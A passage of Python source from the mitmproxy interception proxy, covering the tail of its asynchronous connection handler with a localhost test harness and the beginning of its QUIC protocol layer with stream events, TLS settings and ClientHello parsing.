self.register_activity()\n                self.can_timeout.set()\n\n\n@dataclass\nclass ConnectionIO:\n    handler: asyncio.Task | None = None\n    reader: asyncio.StreamReader | mitmproxy_rs.Stream | None = None\n    writer: asyncio.StreamWriter | mitmproxy_rs.Stream | None = None\n\n\nclass ConnectionHandler(metaclass=abc.ABCMeta):\n    transports: MutableMapping[Connection, ConnectionIO]\n    timeout_watchdog: TimeoutWatchdog\n    client: Client\n    max_conns: collections.defaultdict[Address, asyncio.Semaphore]\n    layer: \"layer.Layer\"\n    wakeup_timer: set[asyncio.Task]\n    hook_tasks: set[asyncio.Task]\n\n    def __init__(self, context: Context) -> None:\n        self.client = context.client\n        self.transports = {}\n        self.max_conns = collections.defaultdict(lambda: asyncio.Semaphore(5))\n        self.wakeup_timer = set()\n        self.hook_tasks = set()\n\n        # Ask for the first layer right away.\n        # In a reverse proxy scenario, this is necessary as we would otherwise hang\n        # on protocols that start with a server greeting.\n        self.layer = layer.NextLayer(context, ask_on_start=True)\n        if self.client.transport_protocol == \"tcp\":\n            timeout = TCP_TIMEOUT\n        else:\n            timeout = UDP_TIMEOUT\n        self.timeout_watchdog = TimeoutWatchdog(timeout, self.on_timeout)\n\n        # workaround for https://bugs.python.org/issue40124 / https://bugs.python.org/issue29930\n        self._drain_lock = asyncio.Lock()\n\n    async def handle_client(self) -> None:\n        asyncio_utils.set_current_task_debug_info(\n            name=f\"client handler\",\n            client=self.client.peername,\n        )\n        watch = asyncio_utils.create_task(\n            self.timeout_watchdog.watch(),\n            name=\"timeout watchdog\",\n            client=self.client.peername,\n        )\n\n        self.log(\"client connect\")\n        await self.handle_hook(server_hooks.ClientConnectedHook(self.client))\n        if self.client.error:\n            self.log(\"client kill connection\")\n            writer = self.transports.pop(self.client).writer\n            assert writer\n            writer.close()\n        else:\n            self.server_event(events.Start())\n            handler = asyncio_utils.create_task(\n                self.handle_connection(self.client),\n                name=f\"client connection handler\",\n                client=self.client.peername,\n            )\n            self.transports[self.client].handler = handler\n            await asyncio.wait([handler])\n            if not handler.cancelled() and (e := handler.exception()):\n                self.log(\n                    f\"connection handler has crashed: {e}\",\n                    logging.ERROR,\n                    exc_info=(type(e), e, e.__traceback__),\n                )\n\n        watch.cancel()\n        while self.wakeup_timer:\n            timer = self.wakeup_timer.pop()\n            timer.cancel()\n\n        self.log(\"client disconnect\")\n        self.client.timestamp_end = time.time()\n        await self.handle_hook(server_hooks.ClientDisconnectedHook(self.client))\n\n        if self.transports:\n            self.log(\"closing transports...\", logging.DEBUG)\n            for io in self.transports.values():\n                if io.handler:\n                    io.handler.cancel(\"client disconnected\")\n            await asyncio.wait(\n                [x.handler for x in self.transports.values() if x.handler]\n            )\n            self.log(\"transports closed!\", logging.DEBUG)\n\n    async def open_connection(self, command: commands.OpenConnection) -> None:\n        if not command.connection.address:\n            self.log(f\"Cannot open connection, no hostname given.\")\n            self.server_event(\n                events.OpenConnectionCompleted(\n                    command, f\"Cannot open connection, no hostname given.\"\n                )\n            )\n            return\n\n        hook_data = server_hooks.ServerConnectionHookData(\n            client=self.client, server=command.connection\n        )\n        await self.handle_hook(server_hooks.ServerConnectHook(hook_data))\n        if err := command.connection.error:\n            self.log(\n                f\"server connection to {human.format_address(command.connection.address)} killed before connect: {err}\"\n            )\n            await self.handle_hook(server_hooks.ServerConnectErrorHook(hook_data))\n            self.server_event(\n                events.OpenConnectionCompleted(command, f\"Connection killed: {err}\")\n            )\n            return\n\n        async with self.max_conns[command.connection.address]:\n            reader: asyncio.StreamReader | mitmproxy_rs.Stream\n            writer: asyncio.StreamWriter | mitmproxy_rs.Stream\n            try:\n                command.connection.timestamp_start = time.time()\n                if command.connection.transport_protocol == \"tcp\":\n                    reader, writer = await asyncio.open_connection(\n                        *command.connection.address,\n                        local_addr=command.connection.sockname,\n                    )\n                elif command.connection.transport_protocol == \"udp\":\n                    reader = writer = await mitmproxy_rs.open_udp_connection(\n                        *command.connection.address,\n                        local_addr=command.connection.sockname,\n                    )\n                else:\n                    raise AssertionError(command.connection.transport_protocol)\n            except (OSError, asyncio.CancelledError) as e:\n                err = str(e)\n                if not err:  # str(CancelledError()) returns empty string.\n                    err = \"connection cancelled\"\n                self.log(f\"error establishing server connection: {err}\")\n                command.connection.error = err\n                await self.handle_hook(server_hooks.ServerConnectErrorHook(hook_data))\n                self.server_event(events.OpenConnectionCompleted(command, err))\n                if isinstance(e, asyncio.CancelledError):\n                    # From https://docs.python.org/3/library/asyncio-exceptions.html#asyncio.CancelledError:\n                    # > In almost all situations the exception must be re-raised.\n                    # It is not really defined what almost means here, but we play safe.\n                    raise\n            else:\n                if command.connection.transport_protocol == \"tcp\":\n                    # TODO: Rename to `timestamp_setup` and make it agnostic for both TCP (SYN/ACK) and UDP (DNS resl.)\n                    command.connection.timestamp_tcp_setup = time.time()\n                command.connection.state = ConnectionState.OPEN\n                command.connection.peername = writer.get_extra_info(\"peername\")\n                command.connection.sockname = writer.get_extra_info(\"sockname\")\n                self.transports[command.connection] = ConnectionIO(\n                    handler=asyncio.current_task(),\n                    reader=reader,\n                    writer=writer,\n                )\n\n                assert command.connection.peername\n                if command.connection.address[0] != command.connection.peername[0]:\n                    addr = f\"{human.format_address(command.connection.address)} ({human.format_address(command.connection.peername)})\"\n                else:\n                    addr = human.format_address(command.connection.address)\n                self.log(f\"server connect {addr}\")\n                await self.handle_hook(server_hooks.ServerConnectedHook(hook_data))\n                self.server_event(events.OpenConnectionCompleted(command, None))\n\n                try:\n                    await self.handle_connection(command.connection)\n                finally:\n                    self.log(f\"server disconnect {addr}\")\n                    command.connection.timestamp_end = time.time()\n                    await self.handle_hook(\n                        server_hooks.ServerDisconnectedHook(hook_data)\n                    )\n\n    async def wakeup(self, request: commands.RequestWakeup) -> None:\n        await asyncio.sleep(request.delay)\n        task = asyncio.current_task()\n        assert task is not None\n        self.wakeup_timer.discard(task)\n        self.server_event(events.Wakeup(request))\n\n    async def handle_connection(self, connection: Connection) -> None:\n        \"\"\"\n        Handle a connection for its entire lifetime.\n        This means we read until EOF,\n        but then possibly also keep on waiting for our side of the connection to be closed.\n        \"\"\"\n        cancelled = None\n        reader = self.transports[connection].reader\n        assert reader\n        while True:\n            try:\n                data = await reader.read(65535)\n                if not data:\n                    raise OSError(\"Connection closed by peer.\")\n            except OSError:\n                break\n            except asyncio.CancelledError as e:\n                cancelled = e\n                break\n\n            self.server_event(events.DataReceived(connection, data))\n\n            try:\n                await self.drain_writers()\n            except asyncio.CancelledError as e:\n                cancelled = e\n                break\n\n        if cancelled is None and connection.transport_protocol == \"tcp\":\n            # TCP connections can be half-closed.\n            connection.state &= ~ConnectionState.CAN_READ\n        else:\n            connection.state = ConnectionState.CLOSED\n\n        self.server_event(events.ConnectionClosed(connection))\n\n        if connection.state is ConnectionState.CAN_WRITE:\n            # we may still use this connection to *send* stuff,\n            # even though the remote has closed their side of the connection.\n            # to make this work we keep this task running and wait for cancellation.\n            try:\n                await asyncio.Event().wait()\n            except asyncio.CancelledError as e:\n                cancelled = e\n\n        try:\n            writer = self.transports[connection].writer\n            assert writer\n            writer.close()\n        except OSError:\n            pass\n        self.transports.pop(connection)\n\n        if cancelled:\n            raise cancelled\n\n    async def drain_writers(self):\n        \"\"\"\n        Drain all writers to create some backpressure. We won't continue reading until there's space available in our\n        write buffers, so if we cannot write fast enough our own read buffers run full and the TCP recv stream is throttled.\n        \"\"\"\n        async with self._drain_lock:\n            for transport in list(self.transports.values()):\n                if transport.writer is not None:\n                    try:\n                        await transport.writer.drain()\n                    except OSError as e:\n                        if transport.handler is not None:\n                            transport.handler.cancel(f\"Error sending data: {e}\")\n\n    async def on_timeout(self) -> None:\n        try:\n            handler = self.transports[self.client].handler\n        except KeyError:  # pragma: no cover\n            # there is a super short window between connection close and watchdog cancellation\n            pass\n        else:\n            if self.client.transport_protocol == \"tcp\":\n                self.log(f\"Closing connection due to inactivity: {self.client}\")\n            assert handler\n            handler.cancel(\"timeout\")\n\n    async def hook_task(self, hook: commands.StartHook) -> None:\n        await self.handle_hook(hook)\n        if hook.blocking:\n            self.server_event(events.HookCompleted(hook))\n\n    @abc.abstractmethod\n    async def handle_hook(self, hook: commands.StartHook) -> None:\n        pass\n\n    def log(\n        self,\n        message: str,\n        level: int = logging.INFO,\n        exc_info: Literal[True]\n        | tuple[type[BaseException], BaseException, TracebackType | None]\n        | None = None,\n    ) -> None:\n        logger.log(\n            level, message, extra={\"client\": self.client.peername}, exc_info=exc_info\n        )\n\n    def server_event(self, event: events.Event) -> None:\n        self.timeout_watchdog.register_activity()\n        try:\n            layer_commands = self.layer.handle_event(event)\n            for command in layer_commands:\n                if isinstance(command, commands.OpenConnection):\n                    assert command.connection not in self.transports\n                    handler = asyncio_utils.create_task(\n                        self.open_connection(command),\n                        name=f\"server connection handler {command.connection.address}\",\n                        client=self.client.peername,\n                    )\n                    self.transports[command.connection] = ConnectionIO(handler=handler)\n                elif isinstance(command, commands.RequestWakeup):\n                    task = asyncio_utils.create_task(\n                        self.wakeup(command),\n                        name=f\"wakeup timer ({command.delay:.1f}s)\",\n                        client=self.client.peername,\n                    )\n                    assert task is not None\n                    self.wakeup_timer.add(task)\n                elif (\n                    isinstance(command, commands.ConnectionCommand)\n                    and command.connection not in self.transports\n                ):\n                    pass  # The connection has already been closed.\n                elif isinstance(command, commands.SendData):\n                    writer = self.transports[command.connection].writer\n                    assert writer\n                    if not writer.is_closing():\n                        writer.write(command.data)\n                elif isinstance(command, commands.CloseTcpConnection):\n                    self.close_connection(command.connection, command.half_close)\n                elif isinstance(command, commands.CloseConnection):\n                    self.close_connection(command.connection, False)\n                elif isinstance(command, commands.StartHook):\n                    t = asyncio_utils.create_task(\n                        self.hook_task(command),\n                        name=f\"handle_hook({command.name})\",\n                        client=self.client.peername,\n                    )\n                    # Python 3.11 Use TaskGroup instead.\n                    self.hook_tasks.add(t)\n                    t.add_done_callback(self.hook_tasks.remove)\n                elif isinstance(command, commands.Log):\n                    self.log(command.message, command.level)\n                else:\n                    raise RuntimeError(f\"Unexpected command: {command}\")\n        except Exception:\n            self.log(f\"mitmproxy has crashed!\", logging.ERROR, exc_info=True)\n\n    def close_connection(\n        self, connection: Connection, half_close: bool = False\n    ) -> None:\n        if half_close:\n            if not connection.state & ConnectionState.CAN_WRITE:\n                return\n            self.log(f\"half-closing {connection}\", logging.DEBUG)\n            try:\n                writer = self.transports[connection].writer\n                assert writer\n                if not writer.is_closing():\n                    writer.write_eof()\n            except OSError:\n                # if we can't write to the socket anymore we presume it completely dead.\n                connection.state = ConnectionState.CLOSED\n            else:\n                connection.state &= ~ConnectionState.CAN_WRITE\n        else:\n            connection.state = ConnectionState.CLOSED\n\n        if connection.state is ConnectionState.CLOSED:\n            handler = self.transports[connection].handler\n            assert handler\n            handler.cancel(\"closed by command\")\n\n\nclass LiveConnectionHandler(ConnectionHandler, metaclass=abc.ABCMeta):\n    def __init__(\n        self,\n        reader: asyncio.StreamReader | mitmproxy_rs.Stream,\n        writer: asyncio.StreamWriter | mitmproxy_rs.Stream,\n        options: moptions.Options,\n        mode: mode_specs.ProxyMode,\n    ) -> None:\n        client = Client(\n            transport_protocol=writer.get_extra_info(\"transport_protocol\", \"tcp\"),\n            peername=writer.get_extra_info(\"peername\"),\n            sockname=writer.get_extra_info(\"sockname\"),\n            timestamp_start=time.time(),\n            proxy_mode=mode,\n            state=ConnectionState.OPEN,\n        )\n        context = Context(client, options)\n        super().__init__(context)\n        self.transports[client] = ConnectionIO(\n            handler=None, reader=reader, writer=writer\n        )\n\n\nclass SimpleConnectionHandler(LiveConnectionHandler):  # pragma: no cover\n    \"\"\"Simple handler that does not really process any hooks.\"\"\"\n\n    hook_handlers: dict[str, Callable]\n\n    def __init__(self, reader, writer, options, mode, hooks):\n        super().__init__(reader, writer, options, mode)\n        self.hook_handlers = hooks\n\n    async def handle_hook(self, hook: commands.StartHook) -> None:\n        if hook.name in self.hook_handlers:\n            self.hook_handlers[hook.name](*hook.args())\n\n\nif __name__ == \"__main__\":  # pragma: no cover\n    # simple standalone implementation for testing.\n    loop = asyncio.get_event_loop()\n\n    opts = moptions.Options()\n    # options duplicated here to simplify testing setup\n    opts.add_option(\n        \"connection_strategy\",\n        str,\n        \"lazy\",\n        \"Determine when server connections should be established.\",\n        choices=(\"eager\", \"lazy\"),\n    )\n    opts.add_option(\n        \"keep_host_header\",\n        bool,\n        False,\n        \"\"\"\n        Reverse Proxy: Keep the original host header instead of rewriting it\n        to the reverse proxy target.\n        \"\"\",\n    )\n\n    async def handle(reader, writer):\n        layer_stack = [\n            # lambda ctx: layers.ServerTLSLayer(ctx),\n            # lambda ctx: layers.HttpLayer(ctx, HTTPMode.regular),\n            # lambda ctx: setattr(ctx.server, \"tls\", True) or layers.ServerTLSLayer(ctx),\n            # lambda ctx: layers.ClientTLSLayer(ctx),\n            lambda ctx: layers.modes.ReverseProxy(ctx),\n            lambda ctx: layers.HttpLayer(ctx, HTTPMode.transparent),\n        ]\n\n        def next_layer(nl: layer.NextLayer):\n            layr = layer_stack.pop(0)(nl.context)\n            layr.debug = \"  \" * len(nl.context.layers)\n            nl.layer = layr\n\n        def request(flow: http.HTTPFlow):\n            if \"cached\" in flow.request.path:\n                flow.response = http.Response.make(418, f\"(cached) {flow.request.text}\")\n            if \"toggle-tls\" in flow.request.path:\n                if flow.request.url.startswith(\"https://\"):\n                    flow.request.url = flow.request.url.replace(\"https://\", \"http://\")\n                else:\n                    flow.request.url = flow.request.url.replace(\"http://\", \"https://\")\n            if \"redirect\" in flow.request.path:\n                flow.request.host = \"httpbin.org\"\n\n        def tls_start_client(tls_start: tls.TlsData):\n            # INSECURE\n            ssl_context = SSL.Context(SSL.SSLv23_METHOD)\n            ssl_context.use_privatekey_file(\n                pkg_data.path(\n                    \"../test/mitmproxy/data/verificationcerts/trusted-leaf.key\"\n                )\n            )\n            ssl_context.use_certificate_chain_file(\n                pkg_data.path(\n                    \"../test/mitmproxy/data/verificationcerts/trusted-leaf.crt\"\n                )\n            )\n            tls_start.ssl_conn = SSL.Connection(ssl_context)\n            tls_start.ssl_conn.set_accept_state()\n\n        def tls_start_server(tls_start: tls.TlsData):\n            # INSECURE\n            ssl_context = SSL.Context(SSL.SSLv23_METHOD)\n            tls_start.ssl_conn = SSL.Connection(ssl_context)\n            tls_start.ssl_conn.set_connect_state()\n            if tls_start.context.client.sni is not None:\n                tls_start.ssl_conn.set_tlsext_host_name(\n                    tls_start.context.client.sni.encode()\n                )\n\n        await SimpleConnectionHandler(\n            reader,\n            writer,\n            opts,\n            mode_specs.ProxyMode.parse(\"reverse:http://127.0.0.1:3000/\"),\n            {\n                \"next_layer\": next_layer,\n                \"request\": request,\n                \"tls_start_client\": tls_start_client,\n                \"tls_start_server\": tls_start_server,\n            },\n        ).handle_client()\n\n    coro = asyncio.start_server(handle, \"127.0.0.1\", 8080, loop=loop)\n    server = loop.run_until_complete(coro)\n\n    # Serve requests until Ctrl+C is pressed\n    assert server.sockets\n    print(f\"Serving on {human.format_address(server.sockets[0].getsockname())}\")\n    try:\n        loop.run_forever()\n    except KeyboardInterrupt:\n        pass\n\n    # Close the server\n    server.close()\n    loop.run_until_complete(server.wait_closed())\n    loop.close()\n", "mitmproxy/proxy/layers/quic.py": "from __future__ import annotations\n\nimport time\nfrom collections.abc import Callable\nfrom dataclasses import dataclass\nfrom dataclasses import field\nfrom logging import DEBUG\nfrom logging import ERROR\nfrom logging import WARNING\nfrom ssl import VerifyMode\n\nfrom aioquic.buffer import Buffer as QuicBuffer\nfrom aioquic.h3.connection import ErrorCode as H3ErrorCode\nfrom aioquic.quic import events as quic_events\nfrom aioquic.quic.configuration import QuicConfiguration\nfrom aioquic.quic.connection import QuicConnection\nfrom aioquic.quic.connection import QuicConnectionError\nfrom aioquic.quic.connection import QuicConnectionState\nfrom aioquic.quic.connection import QuicErrorCode\nfrom aioquic.quic.connection import stream_is_client_initiated\nfrom aioquic.quic.connection import stream_is_unidirectional\nfrom aioquic.quic.packet import encode_quic_version_negotiation\nfrom aioquic.quic.packet import PACKET_TYPE_INITIAL\nfrom aioquic.quic.packet import pull_quic_header\nfrom aioquic.quic.packet import QuicProtocolVersion\nfrom aioquic.tls import CipherSuite\nfrom aioquic.tls import HandshakeType\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives.asymmetric import dsa\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.hazmat.primitives.asymmetric import rsa\n\nfrom mitmproxy import certs\nfrom mitmproxy import connection\nfrom mitmproxy import ctx\nfrom mitmproxy.net import tls\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import context\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy import tunnel\nfrom mitmproxy.proxy.layers.modes import TransparentProxy\nfrom mitmproxy.proxy.layers.tcp import TCPLayer\nfrom mitmproxy.proxy.layers.tls import TlsClienthelloHook\nfrom mitmproxy.proxy.layers.tls import TlsEstablishedClientHook\nfrom mitmproxy.proxy.layers.tls import TlsEstablishedServerHook\nfrom mitmproxy.proxy.layers.tls import TlsFailedClientHook\nfrom mitmproxy.proxy.layers.tls import TlsFailedServerHook\nfrom mitmproxy.proxy.layers.udp import UDPLayer\nfrom mitmproxy.tls import ClientHello\nfrom mitmproxy.tls import ClientHelloData\nfrom mitmproxy.tls import TlsData\n\n\n@dataclass\nclass QuicTlsSettings:\n    \"\"\"\n    Settings necessary to establish QUIC's TLS context.\n    \"\"\"\n\n    alpn_protocols: list[str] | None = None\n    \"\"\"A list of supported ALPN protocols.\"\"\"\n    certificate: x509.Certificate | None = None\n    \"\"\"The certificate to use for the connection.\"\"\"\n    certificate_chain: list[x509.Certificate] = field(default_factory=list)\n    \"\"\"A list of additional certificates to send to the peer.\"\"\"\n    certificate_private_key: (\n        dsa.DSAPrivateKey | ec.EllipticCurvePrivateKey | rsa.RSAPrivateKey | None\n    ) = None\n    \"\"\"The certificate's private key.\"\"\"\n    cipher_suites: list[CipherSuite] | None = None\n    \"\"\"An optional list of allowed/advertised cipher suites.\"\"\"\n    ca_path: str | None = None\n    \"\"\"An optional path to a directory that contains the necessary information to verify the peer certificate.\"\"\"\n    ca_file: str | None = None\n    \"\"\"An optional path to a PEM file that will be used to verify the peer certificate.\"\"\"\n    verify_mode: VerifyMode | None = None\n    \"\"\"An optional flag that specifies how/if the peer's certificate should be validated.\"\"\"\n\n\n@dataclass\nclass QuicTlsData(TlsData):\n    \"\"\"\n    Event data for `quic_start_client` and `quic_start_server` event hooks.\n    \"\"\"\n\n    settings: QuicTlsSettings | None = None\n    \"\"\"\n    The associated `QuicTlsSettings` object.\n    This will be set by an addon in the `quic_start_*` event hooks.\n    \"\"\"\n\n\n@dataclass\nclass QuicStartClientHook(commands.StartHook):\n    \"\"\"\n    TLS negotiation between mitmproxy and a client over QUIC is about to start.\n\n    An addon is expected to initialize data.settings.\n    (by default, this is done by `mitmproxy.addons.tlsconfig`)\n    \"\"\"\n\n    data: QuicTlsData\n\n\n@dataclass\nclass QuicStartServerHook(commands.StartHook):\n    \"\"\"\n    TLS negotiation between mitmproxy and a server over QUIC is about to start.\n\n    An addon is expected to initialize data.settings.\n    (by default, this is done by `mitmproxy.addons.tlsconfig`)\n    \"\"\"\n\n    data: QuicTlsData\n\n\n@dataclass\nclass QuicStreamEvent(events.ConnectionEvent):\n    \"\"\"Base class for all QUIC stream events.\"\"\"\n\n    stream_id: int\n    \"\"\"The ID of the stream the event was fired for.\"\"\"\n\n\n@dataclass\nclass QuicStreamDataReceived(QuicStreamEvent):\n    \"\"\"Event that is fired whenever data is received on a stream.\"\"\"\n\n    data: bytes\n    \"\"\"The data which was received.\"\"\"\n    end_stream: bool\n    \"\"\"Whether the STREAM frame had the FIN bit set.\"\"\"\n\n    def __repr__(self):\n        target = type(self.connection).__name__.lower()\n        end_stream = \"[end_stream] \" if self.end_stream else \"\"\n        return f\"QuicStreamDataReceived({target} on {self.stream_id}, {end_stream}{self.data!r})\"\n\n\n@dataclass\nclass QuicStreamReset(QuicStreamEvent):\n    \"\"\"Event that is fired when the remote peer resets a stream.\"\"\"\n\n    error_code: int\n    \"\"\"The error code that triggered the reset.\"\"\"\n\n\nclass QuicStreamCommand(commands.ConnectionCommand):\n    \"\"\"Base class for all QUIC stream commands.\"\"\"\n\n    stream_id: int\n    \"\"\"The ID of the stream the command was issued for.\"\"\"\n\n    def __init__(self, connection: connection.Connection, stream_id: int) -> None:\n        super().__init__(connection)\n        self.stream_id = stream_id\n\n\nclass SendQuicStreamData(QuicStreamCommand):\n    \"\"\"Command that sends data on a stream.\"\"\"\n\n    data: bytes\n    \"\"\"The data which should be sent.\"\"\"\n    end_stream: bool\n    \"\"\"Whether the FIN bit should be set in the STREAM frame.\"\"\"\n\n    def __init__(\n        self,\n        connection: connection.Connection,\n        stream_id: int,\n        data: bytes,\n        end_stream: bool = False,\n    ) -> None:\n        super().__init__(connection, stream_id)\n        self.data = data\n        self.end_stream = end_stream\n\n    def __repr__(self):\n        target = type(self.connection).__name__.lower()\n        end_stream = \"[end_stream] \" if self.end_stream else \"\"\n        return f\"SendQuicStreamData({target} on {self.stream_id}, {end_stream}{self.data!r})\"\n\n\nclass ResetQuicStream(QuicStreamCommand):\n    \"\"\"Abruptly terminate the sending part of a stream.\"\"\"\n\n    error_code: int\n    \"\"\"An error code indicating why the stream is being reset.\"\"\"\n\n    def __init__(\n        self, connection: connection.Connection, stream_id: int, error_code: int\n    ) -> None:\n        super().__init__(connection, stream_id)\n        self.error_code = error_code\n\n\nclass StopQuicStream(QuicStreamCommand):\n    \"\"\"Request termination of the receiving part of a stream.\"\"\"\n\n    error_code: int\n    \"\"\"An error code indicating why the stream is being stopped.\"\"\"\n\n    def __init__(\n        self, connection: connection.Connection, stream_id: int, error_code: int\n    ) -> None:\n        super().__init__(connection, stream_id)\n        self.error_code = error_code\n\n\nclass CloseQuicConnection(commands.CloseConnection):\n    \"\"\"Close a QUIC connection.\"\"\"\n\n    error_code: int\n    \"The error code which was specified when closing the connection.\"\n\n    frame_type: int | None\n    \"The frame type which caused the connection to be closed, or `None`.\"\n\n    reason_phrase: str\n    \"The human-readable reason for which the connection was closed.\"\n\n    # XXX: A bit much boilerplate right now. Should switch to dataclasses.\n    def __init__(\n        self,\n        conn: connection.Connection,\n        error_code: int,\n        frame_type: int | None,\n        reason_phrase: str,\n    ) -> None:\n        super().__init__(conn)\n        self.error_code = error_code\n        self.frame_type = frame_type\n        self.reason_phrase = reason_phrase\n\n\nclass QuicConnectionClosed(events.ConnectionClosed):\n    \"\"\"QUIC connection has been closed.\"\"\"\n\n    error_code: int\n    \"The error code which was specified when closing the connection.\"\n\n    frame_type: int | None\n    \"The frame type which caused the connection to be closed, or `None`.\"\n\n    reason_phrase: str\n    \"The human-readable reason for which the connection was closed.\"\n\n    def __init__(\n        self,\n        conn: connection.Connection,\n        error_code: int,\n        frame_type: int | None,\n        reason_phrase: str,\n    ) -> None:\n        super().__init__(conn)\n        self.error_code = error_code\n        self.frame_type = frame_type\n        self.reason_phrase = reason_phrase\n\n\nclass QuicSecretsLogger:\n    logger: tls.MasterSecretLogger\n\n    def __init__(self, logger: tls.MasterSecretLogger) -> None:\n        super().__init__()\n        self.logger = logger\n\n    def write(self, s: str) -> int:\n        if s[-1:] == \"\\n\":\n            s = s[:-1]\n        data = s.encode(\"ascii\")\n        self.logger(None, data)  # type: ignore\n        return len(data) + 1\n\n    def flush(self) -> None:\n        # done by the logger during write\n        pass\n\n\ndef error_code_to_str(error_code: int) -> str:\n    \"\"\"Returns the corresponding name of the given error code or a string containing its numeric value.\"\"\"\n\n    try:\n        return H3ErrorCode(error_code).name\n    except ValueError:\n        try:\n            return QuicErrorCode(error_code).name\n        except ValueError:\n            return f\"unknown error (0x{error_code:x})\"\n\n\ndef is_success_error_code(error_code: int) -> bool:\n    \"\"\"Returns whether the given error code actually indicates no error.\"\"\"\n\n    return error_code in (QuicErrorCode.NO_ERROR, H3ErrorCode.H3_NO_ERROR)\n\n\ndef tls_settings_to_configuration(\n    settings: QuicTlsSettings,\n    is_client: bool,\n    server_name: str | None = None,\n) -> QuicConfiguration:\n    \"\"\"Converts `QuicTlsSettings` to `QuicConfiguration`.\"\"\"\n\n    return QuicConfiguration(\n        alpn_protocols=settings.alpn_protocols,\n        is_client=is_client,\n        secrets_log_file=(\n            QuicSecretsLogger(tls.log_master_secret)  # type: ignore\n            if tls.log_master_secret is not None\n            else None\n        ),\n        server_name=server_name,\n        cafile=settings.ca_file,\n        capath=settings.ca_path,\n        certificate=settings.certificate,\n        certificate_chain=settings.certificate_chain,\n        cipher_suites=settings.cipher_suites,\n        private_key=settings.certificate_private_key,\n        verify_mode=settings.verify_mode,\n        max_datagram_frame_size=65536,\n    )\n\n\n@dataclass\nclass QuicClientHello(Exception):\n    \"\"\"Helper error only used in `quic_parse_client_hello`.\"\"\"\n\n    data: bytes\n\n\ndef quic_parse_client_hello(data: bytes) -> ClientHello:\n    \"\"\"Helper function that parses a client hello packet.\"\"\"\n\n    # ensure the first packet is indeed the initial one\n    buffer = QuicBuffer(data=data)\n    header = pull_quic_header(buffer, 8)\n    if header.packet_type != PACKET_TYPE_INITIAL:\n        raise ValueError(\"Packet is not initial one.\")\n\n    # patch aioquic to intercept the client hello\n    quic = QuicConnection(\n        configuration=QuicConfiguration(\n            is_client=False,\n            certificate=\"\",\n            private_key=\"\",\n        ),\n        original_destination_connection_id=header.destination_cid,\n    )\n    _initialize = quic._initialize\n\n    def server_handle_hello_replacement(\n        input_buf: QuicBuffer,\n        initial_buf: QuicBuffer,\n        handshake_buf: QuicBuffer,\n        onertt_buf: QuicBuffer,\n    ) -> None:\n        assert input_buf.pull_uint8() == HandshakeType.CLIENT_HELLO\n        length = 0\n        for b in input_buf.pull_bytes(3):\n            length = (length << 8) | b\n        offset = input_buf.tell()\n        raise QuicClientHello(input_buf.data_slice(offset, offset + length))\n\n    def initialize_replacement(peer_cid: bytes) -> None:\n        try:\n            return _initialize(peer_cid)\n        finally:\n            quic.tls._server_handle_hello = server_handle_hello_replacement  # type: ignore\n\n    quic._initialize = initialize_replacement  # type: ignore\n    try:\n        quic.receive_datagram(data, (\"0.0.0.0\", 0), now=0)\n    except QuicClientHello as hello:\n        try:\n            return ClientHello(hello.data)\n        except EOFError as e:\n            raise ValueError(\"Invalid ClientHello data.\") from e\n    except QuicConnectionError as e:\n        raise ValueError(e.reason_phrase) from e\n    raise ValueError(\"No ClientHello returned.\")\n\n\nclass QuicStreamNextLayer(layer.NextLayer):\n    \"\"\"`NextLayer` variant that callbacks `QuicStreamLayer` after layer decision.\"\"\"\n\n    def __init__(\n        self,\n        context: context.Context,\n        stream: QuicStreamLayer,\n        ask_on_start: bool = False,\n    ) -> None:\n        super().__init__(context, ask_on_start)\n        self._stream = stream\n        self._layer: layer.Layer | None = None\n\n    @property  # type: ignore\n    def layer(self) -> layer.Layer | None:  # type: ignore\n        return self._layer\n\n    @layer.setter\n    def layer(self, value: layer.Layer | None) -> None:\n        self._layer = value\n        if self._layer:\n            self._stream.refresh_metadata()\n\n\nclass QuicStreamLayer(layer.Layer):\n    \"\"\"\n    Layer for QUIC streams.\n    Serves as a marker for NextLayer and keeps track of the connection states.\n    \"\"\"\n\n    client: connection.Client\n    \"\"\"Virtual client connection for this stream. Use this in QuicRawLayer instead of `context.client`.\"\"\"\n    server: connection.Server\n    \"\"\"Virtual server connection for this stream. Use this in QuicRawLayer instead of `context.server`.\"\"\"\n    child_layer: layer.Layer\n    \"\"\"The stream's child layer.\"\"\"\n\n    def __init__(self, context: context.Context, ignore: bool, stream_id: int) -> None:\n        # we mustn't reuse the client from the QUIC connection, as the state and protocol differs\n        self.client = context.client = context.client.copy()\n        self.client.transport_protocol = \"tcp\"\n        self.client.state = connection.ConnectionState.OPEN\n\n        # unidirectional client streams are not fully open, set the appropriate state\n        if stream_is_unidirectional(stream_id):\n            self.client.state = (\n                connection.ConnectionState.CAN_READ\n                if stream_is_client_initiated(stream_id)\n                else connection.ConnectionState.CAN_WRITE\n            )\n        self._client_stream_id = stream_id\n\n        # start with a closed server\n        self.server = context.server = connection.Server(\n            address=context.server.address,\n            transport_protocol=\"tcp\",\n        )\n        self._server_stream_id: int | None = None\n\n        # ignored connections will be assigned a TCPLayer immediately\n        super().__init__(context)\n        self.child_layer = (\n            TCPLayer(context, ignore=True)\n            if ignore\n            else QuicStreamNextLayer(context, self)\n        )\n        self.refresh_metadata()\n\n        # we don't handle any events, pass everything to the child layer\n        self.handle_event = self.child_layer.handle_event  # type: ignore\n        self._handle_event = self.child_layer._handle_event  # type: ignore\n\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        raise AssertionError  # pragma: no cover\n\n    def open_server_stream(self, server_stream_id) -> None:\n        assert self._server_stream_id is None\n        self._server_stream_id = server_stream_id\n        self.server.timestamp_start = time.time()\n        self.server.state = (\n            (\n                connection.ConnectionState.CAN_WRITE\n                if stream_is_client_initiated(server_stream_id)\n                else connection.ConnectionState.CAN_READ\n            )\n            if stream_is_unidirectional(server_stream_id)\n            else connection.ConnectionState.OPEN\n        )\n        self.refresh_metadata()\n\n    def refresh_metadata(self) -> None:\n        # find the first transport layer\n        child_layer: layer.Layer | None = self.child_layer\n        while True:\n            if isinstance(child_layer, layer.NextLayer):\n                child_layer = child_layer.layer\n            elif isinstance(child_layer, tunnel.TunnelLayer):\n                child_layer = child_layer.child_layer\n            else:\n                break  # pragma: no cover\n        if isinstance(child_layer, (UDPLayer, TCPLayer)) and child_layer.flow:\n            child_layer.flow.metadata[\"quic_is_unidirectional\"] = (\n                stream_is_unidirectional(self._client_stream_id)\n            )\n            